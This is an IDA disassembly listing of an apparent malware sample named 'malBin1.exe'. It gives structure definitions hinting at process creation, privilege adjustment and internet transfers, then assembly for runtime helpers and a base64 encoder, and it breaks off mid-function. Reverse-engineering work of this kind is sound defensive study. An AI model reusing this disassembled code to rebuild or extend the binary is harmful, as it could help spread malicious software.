; ---------------------------------------------------------------------------

GUID            struc ; (sizeof=0x10, align=0x4, copyof_2)
                                        ; XREF: .rdata:00422884/r
Data1           dd ?
Data2           dw ?
Data3           dw ?
Data4           db 8 dup(?)
GUID            ends

; ---------------------------------------------------------------------------

FuncInfo        struc ; (sizeof=0x24, mappedto_3)
                                        ; XREF: .rdata:stru_422BE0/r
                                        ; .rdata:stru_4230A0/r ...
magicNumber     dd ?                    ; base 16
maxState        dd ?                    ; base 10
pUnwindMap      dd ?                    ; offset
nTryBlocks      dd ?                    ; base 10
pTryBlockMap    dd ?                    ; offset
nIPMapEntries   dd ?                    ; base 10
pIPtoStateMap   dd ?                    ; offset
pESTypeList     dd ?                    ; offset
EHFlags         dd ?                    ; base 16
FuncInfo        ends

; ---------------------------------------------------------------------------

UnwindMapEntry  struc ; (sizeof=0x8, mappedto_4)
                                        ; XREF: .rdata:stru_422BD8/r
                                        ; .rdata:stru_42307C/r ...
toState         dd ?                    ; base 10
action          dd ?                    ; offset
UnwindMapEntry  ends

; ---------------------------------------------------------------------------

TryBlockMapEntry struc ; (sizeof=0x14, mappedto_5)
                                        ; XREF: .rdata:stru_42308C/r
                                        ; .rdata:stru_4233EC/r ...
tryLow          dd ?                    ; base 10
tryHigh         dd ?                    ; base 10
catchHigh       dd ?                    ; base 10
nCatches        dd ?                    ; base 10
pHandlerArray   dd ?                    ; offset
TryBlockMapEntry ends

; ---------------------------------------------------------------------------

HandlerType     struc ; (sizeof=0x10, mappedto_6)
                                        ; XREF: .rdata:stru_42306C/r
                                        ; .rdata:stru_4233CC/r ...
adjectives      dd ?                    ; base 16
pType           dd ?                    ; offset
dispCatchObj    dd ?                    ; base 10
addressOfHandler dd ?                   ; offset
HandlerType     ends

; ---------------------------------------------------------------------------

_EH4_SCOPETABLE struc ; (sizeof=0x10, align=0x4, copyof_8, variable size)
                                        ; XREF: .rdata:stru_422C08/r
                                        ; .rdata:stru_422C28/r ...
GSCookieOffset  dd ?
GSCookieXOROffset dd ?
EHCookieOffset  dd ?
EHCookieXOROffset dd ?
ScopeRecord     _EH4_SCOPETABLE_RECORD 0 dup(?)
_EH4_SCOPETABLE ends

; ---------------------------------------------------------------------------

_EH4_SCOPETABLE_RECORD struc ; (sizeof=0xC, align=0x4, copyof_7)
                                        ; XREF: _EH4_SCOPETABLE/r
EnclosingLevel  dd ?
FilterFunc      dd ?                    ; offset
HandlerFunc     dd ?                    ; offset
_EH4_SCOPETABLE_RECORD ends

; ---------------------------------------------------------------------------

CPPEH_RECORD    struc ; (sizeof=0x18, align=0x4, copyof_13)
                                        ; XREF: sub_40DB70/r
                                        ; sub_4132F0/r ...
old_esp         dd ?                    ; XREF: sub_40DB70+30/w
                                        ; sub_40DB70:loc_40DCB3/r ...
exc_ptr         dd ?                    ; XREF: sub_4132F0:loc_41337B/r
                                        ; sub_4166A8:loc_4166C5/r ... ; offset
registration    _EH3_EXCEPTION_REGISTRATION ?
                                        ; XREF: sub_40DB70+21/w
                                        ; sub_40DB70+27/o ...
CPPEH_RECORD    ends

; ---------------------------------------------------------------------------

_EH3_EXCEPTION_REGISTRATION struc ; (sizeof=0x10, align=0x4, copyof_10)
                                        ; XREF: CPPEH_RECORD/r
Next            dd ?                    ; XREF: sub_40DB70+148/r
                                        ; sub_4132F0+79/r ... ; offset
ExceptionHandler dd ?                   ; offset
ScopeTable      dd ?                    ; XREF: sub_40DB70+21/w
                                        ; sub_4132F0+23/w ; offset
TryLevel        dd ?                    ; XREF: sub_40DB70+43/w
                                        ; sub_40DB70:loc_40DC74/w ...
_EH3_EXCEPTION_REGISTRATION ends

; ---------------------------------------------------------------------------

_RTL_CRITICAL_SECTION struc ; (sizeof=0x18, align=0x4, copyof_14)
                                        ; XREF: .data:CriticalSection/r
DebugInfo       dd ?                    ; offset
LockCount       dd ?
RecursionCount  dd ?
OwningThread    dd ?                    ; offset
LockSemaphore   dd ?                    ; offset
SpinCount       dd ?
_RTL_CRITICAL_SECTION ends

; ---------------------------------------------------------------------------

_OSVERSIONINFOA struc ; (sizeof=0x94, align=0x4, copyof_23)
                                        ; XREF: sub_4041F0/r
dwOSVersionInfoSize dd ?                ; XREF: sub_4041F0+CF/w
dwMajorVersion  dd ?                    ; XREF: sub_4041F0+20C/r
dwMinorVersion  dd ?                    ; XREF: sub_4041F0+208/r
dwBuildNumber   dd ?
dwPlatformId    dd ?
szCSDVersion    db 128 dup(?)
_OSVERSIONINFOA ends

; ---------------------------------------------------------------------------

_STARTUPINFOW   struc ; (sizeof=0x44, align=0x4, copyof_25)
                                        ; XREF: sub_405F00/r
cb              dd ?                    ; XREF: sub_405F00+284/w
lpReserved      dd ?                    ; XREF: sub_405F00+248/o ; offset
lpDesktop       dd ?                    ; offset
lpTitle         dd ?                    ; offset
dwX             dd ?
dwY             dd ?
dwXSize         dd ?
dwYSize         dd ?
dwXCountChars   dd ?
dwYCountChars   dd ?
dwFillAttribute dd ?
dwFlags         dd ?
wShowWindow     dw ?
cbReserved2     dw ?
lpReserved2     dd ?                    ; offset
hStdInput       dd ?                    ; offset
hStdOutput      dd ?                    ; offset
hStdError       dd ?                    ; offset
_STARTUPINFOW   ends

; ---------------------------------------------------------------------------

_PROCESS_INFORMATION struc ; (sizeof=0x10, align=0x4, copyof_31)
                                        ; XREF: sub_405F00/r
                                        ; sub_4062E0/r ...
hProcess        dd ?                    ; XREF: sub_405F00+237/w
                                        ; sub_405F00+299/r ... ; offset
hThread         dd ?                    ; XREF: sub_405F00+23B/w
                                        ; sub_405F00+2A6/r ... ; offset
dwProcessId     dd ?                    ; XREF: sub_405F00+23F/w
                                        ; sub_4062E0+8B/w ...
dwThreadId      dd ?                    ; XREF: sub_405F00+243/w
                                        ; sub_4062E0+8F/w ...
_PROCESS_INFORMATION ends

; ---------------------------------------------------------------------------

_STARTUPINFOA   struc ; (sizeof=0x44, align=0x4, copyof_32)
                                        ; XREF: sub_4062E0/r
                                        ; sub_4067C0/r ...
cb              dd ?                    ; XREF: sub_4062E0+AE/w
                                        ; sub_4067C0+125/w ...
lpReserved      dd ?                    ; XREF: sub_4067C0+12D/w
                                        ; sub_407110+23A/w ; offset
lpDesktop       dd ?                    ; XREF: sub_4067C0+135/w
                                        ; sub_407110+242/w ; offset
lpTitle         dd ?                    ; XREF: sub_4067C0+131/w
                                        ; sub_407110+23E/w ; offset
dwX             dd ?                    ; XREF: sub_4067C0+145/w
                                        ; sub_407110+252/w
dwY             dd ?                    ; XREF: sub_4067C0+141/w
                                        ; sub_407110+24E/w
dwXSize         dd ?                    ; XREF: sub_4067C0+13D/w
                                        ; sub_407110+24A/w
dwYSize         dd ?                    ; XREF: sub_4067C0+139/w
                                        ; sub_407110+246/w
dwXCountChars   dd ?
dwYCountChars   dd ?
dwFillAttribute dd ?
dwFlags         dd ?                    ; XREF: sub_4067C0+150/w
                                        ; sub_407110+265/w
wShowWindow     dw ?                    ; XREF: sub_4067C0+EB/w
                                        ; sub_407110+20B/w
cbReserved2     dw ?                    ; XREF: sub_4067C0+104/w
                                        ; sub_407110+25D/w ...
lpReserved2     dd ?                    ; XREF: sub_4067C0+149/w
                                        ; sub_407110+256/w ... ; offset
hStdInput       dd ?                    ; XREF: sub_4067C0+114/w
                                        ; sub_407110+270/w ; offset
hStdOutput      dd ?                    ; XREF: sub_4067C0+F7/w
                                        ; sub_407110+219/w ; offset
hStdError       dd ?                    ; XREF: sub_4067C0+FB/w
                                        ; sub_407110+220/w ; offset
_STARTUPINFOA   ends

; ---------------------------------------------------------------------------

_SECURITY_ATTRIBUTES struc ; (sizeof=0xC, align=0x4, copyof_34)
                                        ; XREF: sub_4067C0/r
                                        ; sub_407110/r ...
nLength         dd ?                    ; XREF: sub_4067C0+B0/w
                                        ; sub_407110+1A7/w ...
lpSecurityDescriptor dd ?               ; XREF: sub_4067C0+B8/w
                                        ; sub_407110+1AB/w ... ; offset
bInheritHandle  dd ?                    ; XREF: sub_4067C0+BC/w
                                        ; sub_407110+1AF/w ...
_SECURITY_ATTRIBUTES ends

; ---------------------------------------------------------------------------

_OVERLAPPED     struc ; (sizeof=0x14, align=0x4, copyof_37)
                                        ; XREF: sub_406C90/r
Internal        dd ?
InternalHigh    dd ?
Offset          dd ?
OffsetHigh      dd ?
hEvent          dd ?                    ; XREF: sub_406C90+167/w
                                        ; sub_406C90+195/r ... ; offset
_OVERLAPPED     ends

; ---------------------------------------------------------------------------

_LUID           struc ; (sizeof=0x8, align=0x4, copyof_38)
                                        ; XREF: sub_40DAD0/r
                                        ; sub_40DD30/r ...
LowPart         dd ?                    ; XREF: sub_40DAD0:loc_40DB16/r
                                        ; sub_40DD30+BA/r ...
HighPart        dd ?                    ; XREF: sub_40DAD0+4A/r
                                        ; sub_40DD30+BE/r ...
_LUID           ends

; ---------------------------------------------------------------------------

_TOKEN_PRIVILEGES struc ; (sizeof=0x10, align=0x4, copyof_39)
                                        ; XREF: sub_40DAD0/r
                                        ; sub_40DD30/r ...
PrivilegeCount  dd ?                    ; XREF: sub_40DAD0+6B/w
                                        ; sub_40DD30+D8/w ...
Privileges      LUID_AND_ATTRIBUTES ?   ; XREF: sub_40DAD0+5B/w
                                        ; sub_40DAD0+73/w ...
_TOKEN_PRIVILEGES ends

; ---------------------------------------------------------------------------

LUID_AND_ATTRIBUTES struc ; (sizeof=0xC, align=0x4, copyof_40)
                                        ; XREF: _TOKEN_PRIVILEGES/r
Luid            LUID ?                  ; XREF: sub_40DAD0+5B/w
                                        ; sub_40DAD0+73/w ...
Attributes      dd ?                    ; XREF: sub_40DAD0+77/w
                                        ; sub_40DD30+E0/w ...
LUID_AND_ATTRIBUTES ends

; ---------------------------------------------------------------------------

LUID            struc ; (sizeof=0x8, align=0x4, copyof_42)
                                        ; XREF: LUID_AND_ATTRIBUTES/r
LowPart         dd ?                    ; XREF: sub_40DAD0+5B/w
                                        ; sub_40DD30+CD/w ...
HighPart        dd ?                    ; XREF: sub_40DAD0+73/w
                                        ; sub_40DD30+DC/w ...
LUID            ends

; ---------------------------------------------------------------------------

_EXCEPTION_POINTERS struc ; (sizeof=0x8, align=0x4, copyof_44)
                                        ; XREF: .rdata:ExceptionInfo/r
                                        ; sub_40EB2C/r ...
ExceptionRecord dd ?                    ; XREF: sub_40EB2C+33/w
                                        ; sub_41C890+D8/w ; offset
ContextRecord   dd ?                    ; XREF: sub_40EB2C+42/w
                                        ; sub_41C890+F6/w ; offset
_EXCEPTION_POINTERS ends

; ---------------------------------------------------------------------------

_FILETIME       struc ; (sizeof=0x8, align=0x4, copyof_55)
                                        ; XREF: sub_40F8E3/r
                                        ; sub_417AF4/r
dwLowDateTime   dd ?                    ; XREF: sub_40F8E3+11/r
                                        ; sub_417AF4+D/w ...
dwHighDateTime  dd ?                    ; XREF: sub_40F8E3+14/r
                                        ; sub_417AF4+11/w ...
_FILETIME       ends

; ---------------------------------------------------------------------------

_cpinfo         struc ; (sizeof=0x14, align=0x4, copyof_56)
                                        ; XREF: sub_41178C/r
                                        ; sub_411A3F/r ...
MaxCharSize     dd ?                    ; XREF: sub_411A3F+AF/r
                                        ; sub_41CA83+57/r ...
DefaultChar     db 2 dup(?)
LeadByte        db 12 dup(?)            ; XREF: sub_41178C+42/r
                                        ; sub_41178C+53/o ...
                db ? ; undefined
                db ? ; undefined
_cpinfo         ends

; ---------------------------------------------------------------------------

LARGE_INTEGER   union ; (sizeof=0x8, align=0x8, copyof_58)
                                        ; XREF: sub_417AF4+65/r
                                        ; sub_417AF4+68/r ...
anonymous_0     _LARGE_INTEGER::$837407842DC9087486FDFA5FEB63B74E ?
u               _LARGE_INTEGER::$837407842DC9087486FDFA5FEB63B74E ?
QuadPart        dq ?
LARGE_INTEGER   ends

; ---------------------------------------------------------------------------

_LARGE_INTEGER::$837407842DC9087486FDFA5FEB63B74E struc ; (sizeof=0x8, align=0x4, copyof_60)
                                        ; XREF: LARGE_INTEGER/r
                                        ; LARGE_INTEGER/r
LowPart         dd ?
HighPart        dd ?
_LARGE_INTEGER::$837407842DC9087486FDFA5FEB63B74E ends

; ---------------------------------------------------------------------------

_INTERNET_BUFFERSA struc ; (sizeof=0x28, align=0x4, copyof_62)
                                        ; XREF: sub_40E120/r
dwStructSize    dd ?                    ; XREF: sub_40E120+45/w
Next            dd ?                    ; XREF: sub_40E120+20/w ; offset
lpcszHeader     dd ?                    ; XREF: sub_40E120+24/w ; offset
dwHeadersLength dd ?                    ; XREF: sub_40E120+28/w
dwHeadersTotal  dd ?                    ; XREF: sub_40E120+2C/w
lpvBuffer       dd ?                    ; XREF: sub_40E120+30/w ; offset
dwBufferLength  dd ?                    ; XREF: sub_40E120+34/w
dwBufferTotal   dd ?                    ; XREF: sub_40E120+1C/w
                                        ; sub_40E120+4D/w
dwOffsetLow     dd ?                    ; XREF: sub_40E120+38/w
dwOffsetHigh    dd ?                    ; XREF: sub_40E120+3C/w
_INTERNET_BUFFERSA ends

; ---------------------------------------------------------------------------

; enum _SID_NAME_USE, copyof_43
SidTypeUser      = 1
SidTypeGroup     = 2
SidTypeDomain    = 3
SidTypeAlias     = 4
SidTypeWellKnownGroup  = 5
SidTypeDeletedAccount  = 6
SidTypeInvalid   = 7
SidTypeUnknown   = 8
SidTypeComputer  = 9

;
; +-------------------------------------------------------------------------+
; |   This file has been generated by The Interactive Disassembler (IDA)    |
; |           Copyright (c) 2018 Hex-Rays, <support@hex-rays.com>           |
; |                            Freeware version                             |
; +-------------------------------------------------------------------------+
;
; Input SHA256 : F682BDBD612C0215192BE6C52F08F10C01E7AF9A3136C2F67EC3E7BA563F565D
; Input MD5    : 0B506C6DDE8D07F9EEB82FD01A6F97D4
; Input CRC32  : FE892D53

; File Name   : /home/tom/dev/disassembler/malBin1.exe
; Format      : Portable executable for 80386 (PE)
; Imagebase   : 400000
; Timestamp   : 4EE574CF (Mon Dec 12 03:28:15 2011)
; Section 1. (virtual address 00001000)
; Virtual size                  : 0001E340 ( 123712.)
; Section size in file          : 0001E400 ( 123904.)
; Offset to raw data for section: 00000400
; Flags 60000020: Text Executable Readable
; Alignment     : default
; PDB File Name : E:\XiaoME\SunCloud-Code\Eclipse_A\Release\Eclipse_Client_B.pdb

                include uni.inc ; see unicode subdir of ida for info on unicode

                .686p
                .mmx
                .model flat

; ===========================================================================

; Segment type: Pure code
; Segment permissions: Read/Execute
_text           segment para public 'CODE' use32
                assume cs:_text
                ;org 401000h
                assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B R O U T I N E =======================================


sub_401000      proc near               ; DATA XREF: .rdata:00423380↓o
                mov     dword ptr [ecx], offset off_420260
                jmp     sub_40E716
sub_401000      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_401010      proc near               ; DATA XREF: .rdata:off_420260↓o

arg_0           = byte ptr  4

                push    esi
                mov     esi, ecx
                mov     dword ptr [esi], offset off_420260
                call    sub_40E716
                test    [esp+4+arg_0], 1
                jz      short loc_40102E
                push    esi
                call    sub_40F15B
                add     esp, 4

loc_40102E:                             ; CODE XREF: sub_401010+13↑j
                mov     eax, esi
                pop     esi
                retn    4
sub_401010      endp

; ---------------------------------------------------------------------------
                align 10h
; [00000001 BYTES: COLLAPSED FUNCTION nullsub_2. PRESS CTRL-NUMPAD+ TO EXPAND]
                align 10h

; =============== S U B R O U T I N E =======================================


sub_401050      proc near               ; CODE XREF: sub_407940+247↓p
                                        ; sub_408D80+68↓p ...
                push    esi
                mov     esi, eax
                push    edi
                cmp     esi, 4
                jb      short loc_401074
                lea     esp, [esp+0]

loc_401060:                             ; CODE XREF: sub_401050+22↓j
                mov     eax, [edx]
                cmp     eax, [ecx]
                jnz     short loc_401078
                sub     esi, 4
                add     ecx, 4
                add     edx, 4
                cmp     esi, 4
                jnb     short loc_401060

loc_401074:                             ; CODE XREF: sub_401050+7↑j
                test    esi, esi
                jz      short loc_4010BC

loc_401078:                             ; CODE XREF: sub_401050+14↑j
                movzx   eax, byte ptr [edx]
                movzx   edi, byte ptr [ecx]
                sub     eax, edi
                jnz     short loc_4010B3
                cmp     esi, 1
                jbe     short loc_4010BC
                movzx   eax, byte ptr [edx+1]
                movzx   edi, byte ptr [ecx+1]
                sub     eax, edi
                jnz     short loc_4010B3
                cmp     esi, 2
                jbe     short loc_4010BC
                movzx   eax, byte ptr [edx+2]
                movzx   edi, byte ptr [ecx+2]
                sub     eax, edi
                jnz     short loc_4010B3
                cmp     esi, 3
                jbe     short loc_4010BC
                movzx   eax, byte ptr [edx+3]
                movzx   ecx, byte ptr [ecx+3]
                sub     eax, ecx

loc_4010B3:                             ; CODE XREF: sub_401050+30↑j
                                        ; sub_401050+41↑j ...
                sar     eax, 1Fh
                pop     edi
                or      eax, 1
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_4010BC:                             ; CODE XREF: sub_401050+26↑j
                                        ; sub_401050+35↑j ...
                pop     edi
                xor     eax, eax
                pop     esi
                retn
sub_401050      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4010D0      proc near               ; CODE XREF: sub_401150+8↓p
                                        ; sub_401200+8↓p ...

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_4010D0
                mov     eax, large fs:0
                push    eax
                push    ecx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+18h+var_C]
                mov     large fs:0, eax
                mov     esi, ecx
                mov     [esp+18h+var_10], esi
                call    sub_40E638
                xor     eax, eax
                mov     [esp+18h+var_4], eax
                lea     ecx, [esi+0Ch]
                mov     dword ptr [esi], offset off_42026C
                push    0FFFFFFFFh
                mov     [ecx+14h], eax
                mov     dword ptr [ecx+18h], 0Fh
                push    eax
                mov     [ecx+4], al
                mov     eax, [esp+20h+arg_0]
                push    eax
                call    sub_408CA0
                mov     eax, esi
                mov     ecx, [esp+18h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                add     esp, 10h
                retn    4
sub_4010D0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_401140      proc near               ; DATA XREF: .rdata:00420270↓o
                                        ; .rdata:0042027C↓o ...
                cmp     dword ptr [ecx+24h], 10h
                jb      short loc_40114A
                mov     eax, [ecx+10h]
                retn
; ---------------------------------------------------------------------------

loc_40114A:                             ; CODE XREF: sub_401140+4↑j
                lea     eax, [ecx+10h]
                retn
sub_401140      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_401150      proc near               ; CODE XREF: sub_40E26B+24↓p

arg_0           = dword ptr  4

                mov     eax, [esp+arg_0]
                push    esi
                push    eax
                mov     esi, ecx
                call    sub_4010D0
                mov     dword ptr [esi], offset off_420278
                mov     eax, esi
                pop     esi
                retn    4
sub_401150      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_401170      proc near               ; DATA XREF: .rdata:0042330C↓o
                                        ; .rdata:00423348↓o
                push    esi
                mov     esi, ecx
                mov     dword ptr [esi], offset off_42026C
                cmp     dword ptr [esi+24h], 10h
                jb      short loc_40118B
                mov     eax, [esi+10h]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_40118B:                             ; CODE XREF: sub_401170+D↑j
                xor     eax, eax
                mov     dword ptr [esi+24h], 0Fh
                mov     [esi+20h], eax
                mov     [esi+10h], al
                mov     ecx, esi
                pop     esi
                jmp     sub_40E716
sub_401170      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4011B0      proc near               ; DATA XREF: .rdata:off_42026C↓o
                                        ; .rdata:off_420278↓o ...

arg_0           = byte ptr  4

                push    esi
                mov     esi, ecx
                mov     dword ptr [esi], offset off_42026C
                cmp     dword ptr [esi+24h], 10h
                jb      short loc_4011CB
                mov     eax, [esi+10h]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_4011CB:                             ; CODE XREF: sub_4011B0+D↑j
                xor     eax, eax
                mov     dword ptr [esi+24h], 0Fh
                mov     [esi+20h], eax
                mov     ecx, esi
                mov     [esi+10h], al
                call    sub_40E716
                test    [esp+4+arg_0], 1
                jz      short loc_4011F1
                push    esi
                call    sub_40F15B
                add     esp, 4

loc_4011F1:                             ; CODE XREF: sub_4011B0+36↑j
                mov     eax, esi
                pop     esi
                retn    4
sub_4011B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_401200      proc near               ; CODE XREF: sub_40E2A3+24↓p

arg_0           = dword ptr  4

                mov     eax, [esp+arg_0]
                push    esi
                push    eax
                mov     esi, ecx
                call    sub_4010D0
                mov     dword ptr [esi], offset off_420284
                mov     eax, esi
                pop     esi
                retn    4
sub_401200      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_401220      proc near               ; DATA XREF: .rdata:004232D8↓o

arg_0           = dword ptr  4

                mov     eax, [esp+arg_0]
                push    esi
                push    eax
                mov     esi, ecx
                call    sub_401240
                mov     dword ptr [esi], offset off_420284
                mov     eax, esi
                pop     esi
                retn    4
sub_401220      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_401240      proc near               ; CODE XREF: sub_401220+8↑p
                                        ; sub_409620+8↓p
                                        ; DATA XREF: ...

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_401240
                mov     eax, large fs:0
                push    eax
                push    ecx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+1Ch+var_C]
                mov     large fs:0, eax
                mov     esi, ecx
                mov     [esp+1Ch+var_10], esi
                mov     edi, [esp+1Ch+arg_0]
                push    edi
                call    sub_40E6B9
                xor     edx, edx
                mov     [esp+1Ch+var_4], edx
                push    0FFFFFFFFh
                lea     ecx, [esi+0Ch]
                mov     dword ptr [esi], offset off_42026C
                lea     eax, [edi+0Ch]
                push    edx
                mov     dword ptr [ecx+18h], 0Fh
                mov     [ecx+14h], edx
                push    eax
                mov     [ecx+4], dl
                call    sub_408CA0
                mov     eax, esi
                mov     ecx, [esp+1Ch+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                add     esp, 10h
                retn    4
sub_401240      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame fuzzy-sp

sub_4012C0      proc near               ; CODE XREF: sub_404660+6D↓p
                                        ; sub_404780+58↓p

var_140         = dword ptr -140h
var_13C         = dword ptr -13Ch
var_138         = dword ptr -138h
var_134         = dword ptr -134h
var_130         = dword ptr -130h
var_12C         = dword ptr -12Ch
var_128         = byte ptr -128h
var_E0          = byte ptr -0E0h
var_98          = byte ptr -98h
var_50          = byte ptr -50h
var_4           = dword ptr -4
arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                and     esp, 0FFFFFFF8h
                sub     esp, 144h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+144h+var_4], eax
                push    ebx
                push    esi
                mov     esi, ecx
                mov     ecx, [ebp+arg_0]
                push    edi
                mov     ebx, edx
                test    ecx, ecx
                jnz     short loc_4012FE
                mov     eax, esi
                lea     edx, [eax+1]
                lea     ecx, [ecx+0]

loc_4012F0:                             ; CODE XREF: sub_4012C0+35↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_4012F0
                sub     eax, edx
                mov     [ebp+arg_0], eax
                mov     ecx, eax

loc_4012FE:                             ; CODE XREF: sub_4012C0+26↑j
                lea     eax, [ecx-3]
                xor     edx, edx
                mov     [esp+150h+var_134], 0
                mov     [esp+150h+var_138], esi
                mov     [esp+150h+var_140], ebx
                test    eax, eax
                jle     loc_401446
                lea     ecx, [eax-1]
                mov     eax, 0AAAAAAABh
                mul     ecx
                shr     edx, 1
                inc     edx
                lea     eax, ds:0[edx*4]
                lea     ecx, [edx+edx*2]
                mov     [esp+150h+var_13C], edx
                mov     [esp+150h+var_134], eax
                mov     [esp+150h+var_12C], ecx

loc_40133E:                             ; CODE XREF: sub_4012C0+177↓j
                mov     edx, [esp+150h+var_138]
                mov     eax, [edx]
                mov     ecx, 10h
                mov     esi, offset aAbcdefghijklmn ; "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm"...
                lea     edi, [esp+150h+var_50]
                rep movsd
                mov     edx, eax
                shr     edx, 2
                and     edx, 3Fh
                movsb
                cmp     edx, 3Fh
                ja      short loc_40136E
                mov     dl, [esp+edx+150h+var_50]
                jmp     short loc_401370
; ---------------------------------------------------------------------------

loc_40136E:                             ; CODE XREF: sub_4012C0+A3↑j
                mov     dl, 3Dh

loc_401370:                             ; CODE XREF: sub_4012C0+AC↑j
                movsx   ecx, dl
                mov     [esp+150h+var_130], ecx
                mov     edx, eax
                shr     edx, 0Ch
                mov     ecx, eax
                and     ecx, 3
                shl     ecx, 4
                and     edx, 0Fh
                or      edx, ecx
                mov     ecx, 10h
                mov     esi, offset aAbcdefghijklmn ; "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm"...
                lea     edi, [esp+150h+var_E0]
                rep movsd
                movsb
                cmp     edx, 3Fh
                ja      short loc_4013A5
                mov     dl, [esp+edx+150h+var_E0]
                jmp     short loc_4013A7
; ---------------------------------------------------------------------------

loc_4013A5:                             ; CODE XREF: sub_4012C0+DD↑j
                mov     dl, 3Dh

loc_4013A7:                             ; CODE XREF: sub_4012C0+E3↑j
                movsx   ebx, dl
                mov     edx, eax
                shr     edx, 8
                and     edx, 0Fh
                add     edx, edx
                mov     ecx, eax
                shr     ecx, 16h
                and     ecx, 3
                add     edx, edx
                or      edx, ecx
                mov     ecx, 10h
                mov     esi, offset aAbcdefghijklmn ; "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm"...
                lea     edi, [esp+150h+var_98]
                rep movsd
                movsb
                cmp     edx, 3Fh
                ja      short loc_4013E2
                mov     dl, [esp+edx+150h+var_98]
                jmp     short loc_4013E4
; ---------------------------------------------------------------------------

loc_4013E2:                             ; CODE XREF: sub_4012C0+117↑j
                mov     dl, 3Dh

loc_4013E4:                             ; CODE XREF: sub_4012C0+120↑j
                mov     ecx, 10h
                mov     esi, offset aAbcdefghijklmn ; "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm"...
                lea     edi, [esp+150h+var_128]
                rep movsd
                shr     eax, 10h
                and     eax, 3Fh
                movsx   edx, dl
                movsb
                cmp     eax, 3Fh
                ja      short loc_401409
                mov     al, [esp+eax+150h+var_128]
                jmp     short loc_40140B
; ---------------------------------------------------------------------------

loc_401409:                             ; CODE XREF: sub_4012C0+141↑j
                mov     al, 3Dh

loc_40140B:                             ; CODE XREF: sub_4012C0+147↑j
                add     [esp+150h+var_138], 3
                movsx   ecx, al
                mov     eax, [esp+150h+var_140]
                shl     ecx, 8
                or      ecx, edx
                shl     ecx, 8
                or      ecx, ebx
                shl     ecx, 8
                or      ecx, [esp+150h+var_130]
                add     eax, 4
                sub     [esp+150h+var_13C], 1
                mov     [eax-4], ecx
                mov     [esp+150h+var_140], eax
                jnz     loc_40133E
                mov     ecx, [ebp+arg_0]
                mov     edx, [esp+150h+var_12C]
                mov     ebx, eax

loc_401446:                             ; CODE XREF: sub_4012C0+55↑j
                cmp     edx, ecx
                jge     loc_401581
                sub     ecx, edx
                xor     edx, edx
                mov     [esp+150h+var_140], ecx
                mov     [esp+150h+var_13C], edx
                test    ecx, ecx
                jle     short loc_401475
                mov     edx, [esp+150h+var_138]
                push    ecx
                push    edx
                lea     eax, [esp+158h+var_13C]
                push    eax
                call    sub_414550
                mov     edx, [esp+15Ch+var_13C]
                add     esp, 0Ch

loc_401475:                             ; CODE XREF: sub_4012C0+19C↑j
                mov     ecx, 10h
                mov     esi, offset aAbcdefghijklmn ; "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm"...
                lea     edi, [esp+150h+var_128]
                rep movsd
                mov     eax, edx
                shr     eax, 2
                and     eax, 3Fh
                movsb
                cmp     eax, 3Fh
                ja      short loc_401499
                mov     al, [esp+eax+150h+var_128]
                jmp     short loc_40149B
; ---------------------------------------------------------------------------

loc_401499:                             ; CODE XREF: sub_4012C0+1D1↑j
                mov     al, 3Dh

loc_40149B:                             ; CODE XREF: sub_4012C0+1D7↑j
                mov     [ebx], al
                mov     eax, edx
                shr     eax, 0Ch
                mov     ecx, edx
                and     ecx, 3
                shl     ecx, 4
                and     eax, 0Fh
                or      eax, ecx
                mov     ecx, 10h
                mov     esi, offset aAbcdefghijklmn ; "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm"...
                lea     edi, [esp+150h+var_128]
                rep movsd
                movsb
                cmp     eax, 3Fh
                ja      short loc_4014CB
                mov     al, [esp+eax+150h+var_128]
                jmp     short loc_4014CD
; ---------------------------------------------------------------------------

loc_4014CB:                             ; CODE XREF: sub_4012C0+203↑j
                mov     al, 3Dh

loc_4014CD:                             ; CODE XREF: sub_4012C0+209↑j
                cmp     [esp+150h+var_140], 1
                mov     [ebx+1], al
                jle     short loc_401509
                mov     eax, edx
                shr     eax, 8
                and     eax, 0Fh
                add     eax, eax
                mov     ecx, edx
                shr     ecx, 16h
                and     ecx, 3
                add     eax, eax
                or      eax, ecx
                mov     ecx, 10h
                mov     esi, offset aAbcdefghijklmn ; "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm"...
                lea     edi, [esp+150h+var_128]
                rep movsd
                movsb
                cmp     eax, 3Fh
